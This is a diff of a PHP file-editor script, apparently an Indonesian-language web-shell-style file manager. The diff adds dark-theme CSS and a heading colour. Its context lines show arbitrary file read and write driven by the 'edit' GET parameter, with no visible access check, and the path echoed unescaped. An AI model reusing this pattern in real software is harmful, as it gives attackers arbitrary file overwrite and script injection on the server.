@@ -54,8 +54,17 @@ if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     $fileToEdit = $_GET['edit'];
 
     echo "<h2>Editing: $fileToEdit</h2>";
+    echo "<style>
+    body {
+        background: #1e1e2f;
+        color: #ccc;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        padding: 20px;
+        margin: 0;
+    }
+</style>";
 echo "<div style='background:#2a2a3b; padding:20px; border:1px solid #444; border-radius:8px;'>";
-echo "<h2 style='margin-top:0;'>✏️ Editing: <span style='color:#4ea8ff;'>$fileToEdit</span></h2>";
+echo "<h2 style='margin-top:0;color:#fff;'>✏️ Editing: <span style='color:#4ea8ff;'>$fileToEdit</span></h2>";
 
 if (isset($_POST['file_content'])) {
     if (is_writable($fileToEdit)) {
@@ -76,6 +85,7 @@ echo "<form method='post'>
 </form>
 <div style='margin-top:15px;'><a href='" . $_SERVER['PHP_SELF'] . "' style='color:#4ea8ff;'>← Kembali</a></div>";
 echo "</div>";
+
 exit;
 
 }
